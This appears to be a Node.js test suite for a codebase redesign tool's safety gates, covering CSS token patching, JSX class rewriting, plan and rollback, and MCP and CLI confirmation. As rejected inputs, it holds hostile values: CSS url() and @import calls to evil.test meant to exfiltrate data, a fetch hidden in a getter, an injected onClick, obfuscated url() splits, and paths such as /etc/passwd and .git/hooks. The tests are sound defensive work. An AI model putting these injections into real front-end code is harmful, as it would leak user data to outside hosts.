import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  HeadlessEngine,
  analyzeCodebase,
  applyRedesignPlan,
  assertWorkspaceRoot,
  extractCssCustomProperties,
  patchCssTokensSource,
  patchJsxClassStrings,
  planRedesign,
  resolveSafeWorkspaceFile,
  rollbackRedesign,
  runCliCommand,
  verifyFunctionalInvariance,
} from "../packages/studio-host/src/index.ts";

function withTempWorkspace(run) {
  const dir = realpathSync(mkdtempSync(join(tmpdir(), "ninerr-redesign-")));
  const journal = realpathSync(mkdtempSync(join(tmpdir(), "ninerr-redesign-journal-")));
  const projects = realpathSync(mkdtempSync(join(tmpdir(), "ninerr-redesign-projects-")));
  let result;
  try {
    result = run(dir, journal, projects);
  } catch (error) {
    rmSync(dir, { recursive: true, force: true, maxRetries: 5 });
    rmSync(journal, { recursive: true, force: true, maxRetries: 5 });
    rmSync(projects, { recursive: true, force: true, maxRetries: 5 });
    throw error;
  }
  if (result && typeof result.then === "function") {
    return result.finally(() => {
      rmSync(dir, { recursive: true, force: true, maxRetries: 5 });
      rmSync(journal, { recursive: true, force: true, maxRetries: 5 });
      rmSync(projects, { recursive: true, force: true, maxRetries: 5 });
    });
  }
  rmSync(dir, { recursive: true, force: true, maxRetries: 5 });
  rmSync(journal, { recursive: true, force: true, maxRetries: 5 });
  rmSync(projects, { recursive: true, force: true, maxRetries: 5 });
  return result;
}

test("analyzeCodebase discovers framework, styling, CSS tokens, routes, and functional contracts offline", () => withTempWorkspace((root) => {
  mkdirSync(join(root, "src", "app"), { recursive: true });
  writeFileSync(join(root, "package.json"), JSON.stringify({
    name: "sample-app",
    dependencies: { next: "15.0.0", react: "19.0.0", tailwindcss: "4.0.0" },
  }));
  writeFileSync(join(root, "src", "app", "globals.css"), ":root { --bg-canvas: #ffffff; --accent-primary: #3b82f6 }\n");
  writeFileSync(join(root, "src", "app", "page.tsx"), `"use client";
import { useState } from "react";
export default function HomePage() {
  const [count, setCount] = useState(0);
  return (
    <main className="p-4 bg-white">
      <button
        data-testid="inc-btn"
        className={cn("bg-blue-500 text-white", count > 0 && "font-bold")}
        onClick={() => setCount((c) => c + 1)}
      >
        Count: {count}
      </button>
    </main>
  );
}
`);

  const analysis = analyzeCodebase(root);
  assert.equal(analysis.projectName, "sample-app");
  assert.ok(analysis.frameworks.includes("nextjs"));
  assert.ok(analysis.styling.includes("tailwind-v4"));
  assert.ok(analysis.styling.includes("css-variables"));
  assert.equal(analysis.counts.cssTokens, 2);
  assert.equal(analysis.counts.hooks, 1);
  assert.equal(analysis.counts.handlers, 1);
  assert.equal(analysis.counts.testIds, 1);
}));

test("Whole-File AST Invariance Gate approves styling-only changes and blocks logic, handler, directive, testid, and dynamic-style mutations", () => {
  const before = `"use client";
import { useState } from "react";
export function BillingForm({ onSave, styles }) {
  const [amount, setAmount] = useState("100");
  return (
    <form onSubmit={onSave} className="p-4 bg-gray-100">
      <div className={styles.wrapper} style={{ width: \`\${amount}%\` }}>
        <input name="amount" value={amount} onChange={(e) => setAmount(e.target.value)} data-testid="amount-input" />
      </div>
      <button type="submit" className={cn("bg-blue-500 px-3", amount === "" && "opacity-50")}>Pay {amount}</button>
    </form>
  );
}
`;

  const validStyleRedesign = `"use client";
import { useState } from "react";
export function BillingForm({ onSave, styles }) {
  const [amount, setAmount] = useState("100");
  return (
    <form onSubmit={onSave} className="p-8 bg-slate-50 rounded-xl border" style={{ gap: 16 }}>
      <div className={styles.wrapper} style={{ width: \`\${amount}%\`, padding: 12 }}>
        <input name="amount" value={amount} onChange={(e) => setAmount(e.target.value)} data-testid="amount-input" />
      </div>
      <button type="submit" className={cn("bg-teal-700 px-5", amount === "" && "opacity-40")}>Pay {amount}</button>
    </form>
  );
}
`;
  const ok = verifyFunctionalInvariance(before, validStyleRedesign, "BillingForm.tsx");
  assert.equal(ok.ok, true, JSON.stringify(ok.violations));

  // Dropping "use client" directive is blocked.
  assert.equal(verifyFunctionalInvariance(before, validStyleRedesign.replace('"use client";\n', ""), "BillingForm.tsx").ok, false);

  // Altering onSubmit handler is blocked.
  assert.equal(verifyFunctionalInvariance(before, validStyleRedesign.replace("onSubmit={onSave}", "onSubmit={() => {}}"), "BillingForm.tsx").ok, false);

  // Dropping data-testid is blocked.
  assert.equal(verifyFunctionalInvariance(before, validStyleRedesign.replace(' data-testid="amount-input"', ""), "BillingForm.tsx").ok, false);

  // Mutating state initializer business logic is blocked.
  assert.equal(verifyFunctionalInvariance(before, validStyleRedesign.replace('useState("100")', 'useState("0")'), "BillingForm.tsx").ok, false);

  // Dropping a reactive condition inside cn(...) is blocked!
  assert.equal(
    verifyFunctionalInvariance(
      before,
      validStyleRedesign.replace('className={cn("bg-teal-700 px-5", amount === "" && "opacity-40")}', 'className="bg-teal-700 px-5"'),
      "BillingForm.tsx",
    ).ok,
    false,
  );

  // Dropping a CSS module dynamic class binding is blocked!
  assert.equal(
    verifyFunctionalInvariance(
      before,
      validStyleRedesign.replace("className={styles.wrapper}", 'className="p-4"'),
      "BillingForm.tsx",
    ).ok,
    false,
  );

  // Replacing a dynamic inline style template with a static value is blocked!
  assert.equal(
    verifyFunctionalInvariance(
      before,
      validStyleRedesign.replace("width: `${amount}%`", 'width: "50%"'),
      "BillingForm.tsx",
    ).ok,
    false,
  );
});

test("CSS custom property scanner skips comments/strings, handles closing-brace declarations, and rejects unsafe CSS values", () => {
  const css = `
/* --accent: #000000; */
.note::after { content: "--accent: #111111;"; }
:root {
  --bg-canvas: #ffffff;
  --accent: #3b82f6
}
`;
  const props = extractCssCustomProperties(css);
  assert.deepEqual(props.map((p) => [p.name, p.value]), [
    ["--bg-canvas", "#ffffff"],
    ["--accent", "#3b82f6"],
  ]);

  const patched = patchCssTokensSource(css, { "--accent": "#0f766e" });
  assert.equal(patched.changed, true);
  assert.equal(patched.changes.length, 1);
  assert.match(patched.after, /\/\* --accent: #000000; \*\//u);
  assert.match(patched.after, /content: "--accent: #111111;";/u);
  assert.match(patched.after, /--accent: #0f766e\n\}/u);

  // Unsafe CSS values (external loads, scripts, comment/block escapes) are refused.
  assert.throws(() => patchCssTokensSource(css, { "--accent": "url(https://evil.test/a.png)" }), /invalid CSS value/u);
  assert.throws(() => patchCssTokensSource(css, { "--accent": "red; background: url(x)" }), /invalid CSS value/u);
  assert.throws(() => patchCssTokensSource(css, { "--accent": "red /* inject */" }), /invalid CSS value/u);
  assert.throws(() => patchCssTokensSource(css, { "not-a-var": "#000" }), /invalid CSS custom property name/u);
});

test("Tier 2 JSX class patcher handles nested cn/clsx/object/conditional expressions and blocks unsafe class tokens", () => {
  const src = `export function Card({ active, warn }) {
  return (
    <div className={cn(clsx("p-4 bg-blue-500", { "bg-blue-500": active }), warn ? "text-red-500" : "bg-blue-500")}>
      <span>Hello</span>
    </div>
  );
}
`;
  const res = patchJsxClassStrings(src, "Card.tsx", { "bg-blue-500": "bg-teal-700", "p-4": "" });
  assert.equal(res.changed, true);
  assert.equal(res.edits, 3);
  assert.doesNotMatch(res.after, /bg-blue-500/u);
  assert.match(res.after, /"bg-teal-700": active/u);
  assert.match(res.after, /clsx\("bg-teal-700"/u);
  assert.equal(res.invariance.ok, true);

  assert.throws(() => patchJsxClassStrings(src, "Card.tsx", { "bg-blue-500": 'evil" onClick={pwn}' }), /invalid replacement class value/u);
});

test("workspace security rejects path traversal, overlapping projectsRoot, and symlinks", () => withTempWorkspace((root, _journal, projects) => {
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src", "ok.css"), ":root { --a: #111; }\n");

  assert.throws(() => resolveSafeWorkspaceFile(root, "../outside.css"), /invalid-path|escapes/u);
  assert.throws(() => resolveSafeWorkspaceFile(root, "/etc/passwd"), /invalid/u);
  assert.throws(() => resolveSafeWorkspaceFile(root, "src\\ok.css"), /invalid/u);
  assert.throws(() => resolveSafeWorkspaceFile(root, "C:ok.css"), /invalid/u);
  assert.throws(() => assertWorkspaceRoot(projects, projects), /overlap/u);
  assert.throws(() => assertWorkspaceRoot(join(projects, "nested"), projects), /does not exist|overlap/u);

  // Dangling symlink refusal (skip only if OS denies unprivileged symlink creation).
  const linkPath = join(root, "src", "dangling.css");
  let linked = false;
  try {
    symlinkSync(join(root, "nonexistent-target.css"), linkPath);
    linked = true;
  } catch {
    // Windows without Developer Mode may disallow symlink creation for non-admin users.
  }
  if (linked) {
    assert.throws(() => resolveSafeWorkspaceFile(root, "src/dangling.css"), /symlink/u);
  }
}));

test("3-Tier Redesign Engine plans, applies with SHA-256 guard, and rolls back multi-file CSS+JSX changes cleanly", () => withTempWorkspace((root, journalDir) => {
  mkdirSync(join(root, "src"), { recursive: true });
  const cssPath = join(root, "src", "tokens.css");
  const tsxPath = join(root, "src", "Hero.tsx");
  const origCss = ":root {\n  --bg-canvas: #ffffff;\n  --accent-primary: #3b82f6;\n}\n";
  const origTsx = `"use client";
export function Hero({ onStart }) {
  return (
    <section className="p-4 bg-white">
      <button data-testid="cta" className={cn("bg-blue-500 text-white", true && "rounded")} onClick={onStart}>
        Launch
      </button>
    </section>
  );
}
`;
  writeFileSync(cssPath, origCss);
  writeFileSync(tsxPath, origTsx);

  const plan = planRedesign(root, {
    cssTokenUpdates: { "--accent-primary": "#0f766e" },
    jsxClassReplacements: { "bg-blue-500": "bg-teal-700", "p-4": "p-8" },
  });
  assert.equal(plan.patches.length, 2);
  assert.equal(plan.patches.find((p) => p.file === "src/tokens.css").tier, 1);
  assert.equal(plan.patches.find((p) => p.file === "src/Hero.tsx").tier, 2);

  // Tampered planToken fails closed.
  assert.throws(() => applyRedesignPlan(plan, { journalDir, expectedPlanToken: "0".repeat(64) }), /planToken does not match/u);

  // Apply cleanly with planToken binding.
  const applied = applyRedesignPlan(plan, { journalDir, expectedPlanToken: plan.planToken });
  assert.equal(applied.filesApplied.length, 2);
  assert.match(readFileSync(cssPath, "utf8"), /--accent-primary: #0f766e;/u);
  assert.match(readFileSync(tsxPath, "utf8"), /bg-teal-700/u);
  assert.match(readFileSync(tsxPath, "utf8"), /onClick=\{onStart\}/u);
  assert.match(readFileSync(tsxPath, "utf8"), /data-testid="cta"/u);

  // Re-applying stale plan fails closed with SHA-256 conflict.
  assert.throws(() => applyRedesignPlan(plan, { journalDir, expectedPlanToken: plan.planToken }), /changed on disk/u);

  // Exact byte-for-byte rollback restores both files.
  const rolled = rollbackRedesign({ workspaceRoot: root, journalDir, runId: applied.runId });
  assert.equal(rolled.restoredFiles.length, 2);
  assert.equal(readFileSync(cssPath, "utf8"), origCss);
  assert.equal(readFileSync(tsxPath, "utf8"), origTsx);
}));

test("Headless MCP redesign tools enforce workspace binding, dryRun, elicitation confirmation, and rollback", async () => withTempWorkspace(async (root, _journal, projectsRoot) => {
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "demo-app", dependencies: { react: "19.0.0" } }));
  const origCss = ":root { --brand-primary: #2563eb; }\n";
  const origTsx = `export function Banner({ onAction }) {
  return (
    <section className="p-4 bg-white">
      <button data-testid="go" className="bg-blue-500 text-white" onClick={onAction}>Go</button>
    </section>
  );
}
`;
  writeFileSync(join(root, "src", "theme.css"), origCss);
  writeFileSync(join(root, "src", "Banner.tsx"), origTsx);

  // 1. Without workspaceRoot bound, all redesign tools fail closed.
  const unbound = new HeadlessEngine({ projectsRoot, write: () => {} });
  try {
    await unbound.receive({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test" } } });
    await unbound.receive({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "create_project", arguments: { name: "p1" } } });
    const res = await unbound.receive({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "inspect_codebase", arguments: {} } });
    assert.equal(res.result.isError, true);
    assert.match(res.result.content[0].text, /No codebase workspace is bound/u);
  } finally {
    unbound.close();
  }

  // 2. With workspaceRoot bound on a non-elicitation client: read/import/plan/dryRun work, apply is refused.
  const noAsk = new HeadlessEngine({ projectsRoot, workspaceRoot: root, write: () => {} });
  let planToken;
  try {
    await noAsk.receive({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "no-ask" } } });
    await noAsk.receive({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "open_project", arguments: { name: "p1" } } });

    const inspected = await noAsk.receive({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "inspect_codebase", arguments: {} } });
    assert.notEqual(inspected.result.isError, true);
    assert.equal(inspected.result.structuredContent.projectName, "demo-app");

    const impCss = await noAsk.receive({ jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "import_from_codebase", arguments: { file: "src/theme.css" } } });
    assert.notEqual(impCss.result.isError, true);
    assert.equal(impCss.result.structuredContent.adds, 1);

    const impTsx = await noAsk.receive({ jsonrpc: "2.0", id: 5, method: "tools/call", params: { name: "import_from_codebase", arguments: { file: "src/Banner.tsx" } } });
    assert.notEqual(impTsx.result.isError, true);
    assert.equal(impTsx.result.structuredContent.componentName, "Banner");

    const planned = await noAsk.receive({
      jsonrpc: "2.0",
      id: 6,
      method: "tools/call",
      params: {
        name: "plan_redesign",
        arguments: {
          cssTokenUpdates: { "--brand-primary": "#0f766e" },
          jsxClassReplacements: { "bg-blue-500": "bg-teal-700" },
        },
      },
    });
    assert.notEqual(planned.result.isError, true);
    planToken = planned.result.structuredContent.planToken;
    assert.equal(planned.result.structuredContent.fileCount, 2);

    // dryRun asks nothing and writes nothing.
    const dry = await noAsk.receive({
      jsonrpc: "2.0",
      id: 7,
      method: "tools/call",
      params: {
        name: "apply_redesign",
        arguments: {
          dryRun: true,
          action: "apply",
          planToken,
          cssTokenUpdates: { "--brand-primary": "#0f766e" },
          jsxClassReplacements: { "bg-blue-500": "bg-teal-700" },
        },
      },
    });
    assert.notEqual(dry.result.isError, true);
    assert.equal(dry.result.structuredContent.dryRun, true);
    assert.equal(readFileSync(join(root, "src", "theme.css"), "utf8"), origCss);

    // Real apply without elicitation is refused cleanly.
    const refused = await noAsk.receive({
      jsonrpc: "2.0",
      id: 8,
      method: "tools/call",
      params: {
        name: "apply_redesign",
        arguments: {
          action: "apply",
          planToken,
          cssTokenUpdates: { "--brand-primary": "#0f766e" },
          jsxClassReplacements: { "bg-blue-500": "bg-teal-700" },
        },
      },
    });
    assert.equal(refused.result.isError, true);
    assert.match(refused.result.content[0].text, /cannot ask them/u);
    assert.equal(readFileSync(join(root, "src", "theme.css"), "utf8"), origCss);
  } finally {
    noAsk.close();
  }

  // 3. Elicitation-capable client approves apply and then rollback!
  const prompts = [];
  const withAsk = new HeadlessEngine({
    projectsRoot,
    workspaceRoot: root,
    confirmationWaitMs: 5_000,
    write: (msg) => {
      prompts.push(msg);
      if (msg?.method === "elicitation/create") {
        queueMicrotask(() => {
          withAsk.receive({ jsonrpc: "2.0", id: msg.id, result: { action: "accept", content: { approve: true } } });
        });
      }
    },
  });
  try {
    await withAsk.receive({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: { elicitation: {} }, clientInfo: { name: "interactive" } } });
    await withAsk.receive({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "open_project", arguments: { name: "p1" } } });

    const applied = await withAsk.receive({
      jsonrpc: "2.0",
      id: 3,
      method: "tools/call",
      params: {
        name: "apply_redesign",
        arguments: {
          action: "apply",
          planToken,
          cssTokenUpdates: { "--brand-primary": "#0f766e" },
          jsxClassReplacements: { "bg-blue-500": "bg-teal-700" },
        },
      },
    });
    assert.notEqual(applied.result.isError, true, applied.result.content[0].text);
    const runId = applied.result.structuredContent.runId;
    assert.match(runId, /^redesign-/u);
    assert.equal(prompts.length, 1);
    assert.match(prompts[0].params.message, /Apply redesign to 2 files/u);
    assert.match(readFileSync(join(root, "src", "theme.css"), "utf8"), /#0f766e/u);
    assert.match(readFileSync(join(root, "src", "Banner.tsx"), "utf8"), /bg-teal-700/u);

    const rolled = await withAsk.receive({
      jsonrpc: "2.0",
      id: 4,
      method: "tools/call",
      params: { name: "apply_redesign", arguments: { action: "rollback", runId } },
    });
    assert.notEqual(rolled.result.isError, true, rolled.result.content[0].text);
    assert.equal(readFileSync(join(root, "src", "theme.css"), "utf8"), origCss);
    assert.equal(readFileSync(join(root, "src", "Banner.tsx"), "utf8"), origTsx);
  } finally {
    withAsk.close();
  }
}));

test("CLI ninerr redesign inspect -> plan -> apply -> rollback works end to end", async () => withTempWorkspace(async (root, journalDir, scratchDir) => {
  mkdirSync(join(root, "src"), { recursive: true });
  const origCss = ":root { --surface-0: #ffffff; }\n";
  writeFileSync(join(root, "src", "app.css"), origCss);
  const tokensFile = join(scratchDir, "tokens.json");
  const planFile = join(scratchDir, "plan.json");
  writeFileSync(tokensFile, JSON.stringify({ "--surface-0": "#f8fafc" }));

  let out = "";
  let err = "";
  const run = async (argv) => {
    out = "";
    err = "";
    return runCliCommand("redesign", argv, { version: "0.0.0", stdout: (s) => { out += s; }, stderr: (s) => { err += s; } });
  };

  assert.equal(await run(["inspect", root, "--json"]), 0, err);
  assert.equal(JSON.parse(out).counts.cssTokens, 1);

  assert.equal(await run(["plan", root, "--tokens", tokensFile, "--out", planFile, "--json"]), 0, err);
  const planSummary = JSON.parse(out);
  assert.equal(planSummary.fileCount, 1);

  assert.equal(await run(["apply", root, "--plan", planFile, "--expected-token", planSummary.planToken, "--journal", journalDir, "--json"]), 0, err);
  const applied = JSON.parse(out);
  assert.equal(readFileSync(join(root, "src", "app.css"), "utf8"), ":root { --surface-0: #f8fafc; }\n");

  assert.equal(await run(["rollback", root, "--run", applied.runId, "--journal", journalDir, "--json"]), 0, err);
  assert.equal(readFileSync(join(root, "src", "app.css"), "utf8"), origCss);
}));

test("PR 487 review regressions: AST invariance closes ObjectMethod, tag XSS, dynamic keys, cva/helper swaps, and accepts static TS/unary styles", () => {
  // C2: ObjectMethod inside style or cn(...) is blocked!
  const baseDiv = `export function A() { return <div className="p-4">Hi</div>; }\n`;
  assert.equal(
    verifyFunctionalInvariance(
      baseDiv,
      `export function A() { return <div className="p-4" style={{ get x() { fetch("https://evil.test"); return 1; } }}>Hi</div>; }\n`,
      "A.tsx",
    ).ok,
    false,
  );
  assert.equal(
    verifyFunctionalInvariance(
      baseDiv,
      `export function A() { return <div className={cn({ get a() { return true; } })}>Hi</div>; }\n`,
      "A.tsx",
    ).ok,
    false,
  );

  // C3: <div> -> <script>/<style>, <motion.div>, custom elements, <option>, <table>, and TS generics are preserved!
  assert.equal(verifyFunctionalInvariance(`export const A = ({ m }) => <div>{m}</div>;`, `export const A = ({ m }) => <script>{m}</script>;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = () => <motion.div className="p-4">Hi</motion.div>;`, `export const A = () => <div className="p-8">Hi</div>;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = () => <my-checkout className="p-4">Hi</my-checkout>;`, `export const A = () => <div className="p-8">Hi</div>;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = () => <select><option>One</option></select>;`, `export const A = () => <select><div>One</div></select>;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = ({ r }) => <Table<User> rows={r} />;`, `export const A = ({ r }) => <Table rows={r} />;`, "A.tsx").ok, false);

  // H1: dynamic style property rebinding, helper callee swap, and cva removal are blocked!
  assert.equal(verifyFunctionalInvariance(`export const A = ({ n }) => <div style={{ width: \`\${n}%\` }} />;`, `export const A = ({ n }) => <div style={{ opacity: \`\${n}%\` }} />;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = ({ x }) => <div className={cn("p-4", x && "b")} />;`, `export const A = ({ x }) => <div className={twMerge("p-4", x && "b")} />;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = () => <div className="p-4" />;`, `export const A = () => <div className={cn("p-4")} />;`, "A.tsx").ok, false);
  assert.equal(verifyFunctionalInvariance(`export const A = () => <div className={cva("p-4", { variants: { s: { sm: "p-2" } } })} />;`, `export const A = () => <div className="p-4" />;`, "A.tsx").ok, false);

  // H1 false positives fixed: interchangeable <div data-testid> <-> <section data-testid>, unary negative numeric style, and static TS cast pass!
  const beforePos = `export const A = () => <div data-testid="box" style={{ marginTop: -8, padding: 8 } as React.CSSProperties}>Hi</div>;\n`;
  const afterPos = `export const A = () => <section data-testid="box" style={{ marginTop: -12, padding: 16 } as React.CSSProperties}>Hi</section>;\n`;
  assert.equal(verifyFunctionalInvariance(beforePos, afterPos, "A.tsx").ok, true);
});

test("PR 487 review regressions: Tier 3 allowlist, .git/node_modules block, CSS/SCSS/bracket safety, JSX escaping & duplicate keys, and CLI/MCP hardening", async () => withTempWorkspace(async (root, journalDir, projectsRoot) => {
  mkdirSync(join(root, ".git", "hooks"), { recursive: true });
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, ".git", "hooks", "pre-commit"), "#!/bin/sh\necho ok\n");
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "app", dependencies: { tailwindcss: { broken: true } } }));
  writeFileSync(join(root, "src", "tokens.css"), ":root { --accent: #3b82f6; }\n.bg { background: url(https://cdn.example.com/--accent:123); }\n");
  writeFileSync(join(root, "src", "styles.scss"), "// don't touch --accent: #000;\n:root { --accent: #3b82f6; }\n");

  // L1: malformed tailwindcss object in package.json never crashes analyzeCodebase.
  assert.equal(analyzeCodebase(root).projectName, "app");

  // C1: .git/hooks/* and non-component files refused in Tier 3 explicitPatches.
  assert.throws(() => resolveSafeWorkspaceFile(root, ".git/hooks/pre-commit"), /restricted/u);
  assert.throws(() => planRedesign(root, { explicitPatches: [{ file: "package.json", afterContent: "{}" }] }), /only supports JS\/TS\/JSX\/TSX/u);
  assert.throws(() => planRedesign(root, { explicitPatches: [{ file: "src/tokens.css", afterContent: "@import url(https://evil.test);" }] }), /only supports JS\/TS\/JSX\/TSX/u);

  // M2: CSS scanner ignores url(...) and SCSS // comments; cssValueProblem rejects unbalanced [ and vendor loading functions.
  const cssPatched = patchCssTokensSource(readFileSync(join(root, "src", "tokens.css"), "utf8"), { "--accent": "#0f766e" });
  assert.match(cssPatched.after, /url\(https:\/\/cdn\.example\.com\/--accent:123\)/u);
  assert.match(cssPatched.after, /--accent: #0f766e;/u);
  const scssPatched = patchCssTokensSource(readFileSync(join(root, "src", "styles.scss"), "utf8"), { "--accent": "#0f766e" }, { scss: true });
  assert.match(scssPatched.after, /\/\/ don't touch --accent: #000;/u);
  assert.match(scssPatched.after, /--accent: #0f766e;/u);
  assert.throws(() => patchCssTokensSource(":root { --a: red; }", { "--a": "red [" }), /brackets/u);
  assert.throws(() => patchCssTokensSource(":root { --a: red; }", { "--a": "-moz-element(#x)" }), /invalid CSS value/u);

  // M3: JSX escaping preserves escaped quotes and refuses duplicate object keys in clsx.
  const withEscaped = `export const B = () => <div className={"bg-blue-500 before:content-[\\"a\\"]"} />;\n`;
  const escRes = patchJsxClassStrings(withEscaped, "B.tsx", { "bg-blue-500": "bg-teal-700" });
  assert.equal(escRes.invariance.ok, true);
  assert.match(escRes.after, /bg-teal-700/u);
  assert.throws(
    () => patchJsxClassStrings(`export const C = ({ a, b }) => <div className={clsx({ "p-4": a, "p-8": b })} />;`, "C.tsx", { "p-4": "p-8" }),
    /duplicate object key/u,
  );

  // H2: dryRun rollback & read-only journal lookup NEVER create missing journal directories.
  const missingJournal = join(journalDir, "never-create-me");
  const engine = new HeadlessEngine({ projectsRoot, workspaceRoot: root, write: () => {} });
  try {
    await engine.receive({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "test" } } });
    await engine.receive({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "create_project", arguments: { name: "drytest" } } });
    const dryRb = await engine.receive({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "apply_redesign", arguments: { dryRun: true, action: "rollback", runId: "redesign-000000000000" } } });
    assert.equal(dryRb.result.isError, true);
    assert.equal(existsSync(join(projectsRoot, ".ninerr-redesign-journals")), false, "dryRun rollback must not create journal directory");
  } finally {
    engine.close();
  }
  assert.throws(() => rollbackRedesign({ workspaceRoot: root, journalDir: missingJournal, runId: "redesign-000000000000" }), /not found/u);
  assert.equal(existsSync(missingJournal), false);

  // H3: CLI --expected-token empty or valueless is rejected (exit 2), never silently skipped!
  const planFile = join(journalDir, "p.json");
  const plan = planRedesign(root, { cssTokenUpdates: { "--accent": "#0f766e" }, files: ["src/tokens.css"] });
  writeFileSync(planFile, JSON.stringify(plan));
  let errOut = "";
  const rcEmpty = await runCliCommand("redesign", ["apply", root, "--plan", planFile, "--expected-token=", "--journal", journalDir], {
    version: "0.0.0",
    stdout: () => {},
    stderr: (s) => { errOut += s; },
  });
  assert.equal(rcEmpty, 2);
  assert.match(errOut, /--expected-token/u);

  // H4 + H5: Duplicate targets in plan refused; deleted file after redesign requires force: true on rollback!
  const dupPlan = {
    workspaceRoot: plan.workspaceRoot,
    patches: [plan.patches[0], { ...plan.patches[0] }],
    planToken: "",
  };
  assert.throws(() => applyRedesignPlan(dupPlan, { journalDir }), /planToken|more than once/u);
  const applied = applyRedesignPlan(plan, { journalDir, expectedPlanToken: plan.planToken });
  rmSync(join(root, "src", "tokens.css"));
  assert.throws(() => rollbackRedesign({ workspaceRoot: root, journalDir, runId: applied.runId }), /deleted after redesign/u);
  const forced = rollbackRedesign({ workspaceRoot: root, journalDir, runId: applied.runId, force: true });
  assert.deepEqual(forced.restoredFiles, ["src/tokens.css"]);

  // R1: Case-insensitive SKIP_DIRS bypass (.GIT/..., NODE_MODULES/...) is blocked!
  mkdirSync(join(root, "node_modules", "pkg"), { recursive: true });
  writeFileSync(join(root, "node_modules", "pkg", "index.js"), "export const x = 1;\n");
  assert.throws(() => resolveSafeWorkspaceFile(root, ".GIT/hooks/pre-commit"), /restricted/u);
  assert.throws(() => resolveSafeWorkspaceFile(root, "NODE_MODULES/pkg/index.js"), /restricted/u);

  // R2: Crafted Tier 1 CSS plan.json injecting @import/url() is blocked inside applyRedesignPlan!
  const beforeCss = readFileSync(join(root, "src", "tokens.css"), "utf8");
  const evilCss = "@import url(https://evil.test/steal.css);\n" + beforeCss;
  const sha = (s) => createHash("sha256").update(s, "utf8").digest("hex");
  const evilPatch = { file: "src/tokens.css", tier: 1, beforeSha256: sha(beforeCss), afterSha256: sha(evilCss), afterContent: evilCss, summary: "evil" };
  const evilToken = sha(JSON.stringify({ workspaceRoot: realpathSync.native(root), patches: [{ file: evilPatch.file, tier: 1, beforeSha256: evilPatch.beforeSha256, afterSha256: evilPatch.afterSha256 }] }));
  assert.throws(() => applyRedesignPlan({ workspaceRoot: root, planToken: evilToken, patches: [evilPatch] }, { journalDir, expectedPlanToken: evilToken }), /Tier 1 CSS invariance gate/u);

  // R3: External CSS resource loads (url(), image-set(), expression()) are blocked in BOTH Tier 2 and Tier 3!
  assert.throws(
    () => patchJsxClassStrings('export const A = () => <div className="bg-blue-500" />;', "A.tsx", { "bg-blue-500": "bg-[url(https://evil.test/x.png)]" }),
    /invalid replacement class value/u,
  );
  assert.equal(
    verifyFunctionalInvariance(
      'export const A = ({ x }) => <div className="p-4" style={{ width: `${x}%` }} />;',
      'export const A = ({ x }) => <div className="p-4" style={{ width: `url(https://evil.test/?x=${x})` }} />;',
      "A.tsx",
    ).ok,
    false,
  );
  assert.equal(
    verifyFunctionalInvariance(
      'export const A = () => <div className="p-4" />;',
      'export const A = () => <div className="p-4" style={{ backgroundImage: "url(https://evil.test/exfil.png)" }} />;',
      "A.tsx",
    ).ok,
    false,
  );
  assert.equal(
    verifyFunctionalInvariance(
      'export const A = () => <div className="p-4" />;',
      'export const A = () => <div className="bg-[url(https://evil.test/exfil.png)]" />;',
      "A.tsx",
    ).ok,
    false,
  );
  // R3b: Split static TemplateLiteral url() evasion is also blocked!
  assert.equal(
    verifyFunctionalInvariance(
      'export const A = () => <div className="p-4" />;',
      'export const A = () => <div className="p-4" style={{ backgroundImage: `u${"r"}l(https://evil.test/x)` }} />;',
      "A.tsx",
    ).ok,
    false,
  );
  assert.equal(
    verifyFunctionalInvariance(
      'export const A = () => <div className="p-4" />;',
      'export const A = () => <div className={`bg-[u${"r"}l(https://evil.test/x)]`} />;',
      "A.tsx",
    ).ok,
    false,
  );
}));
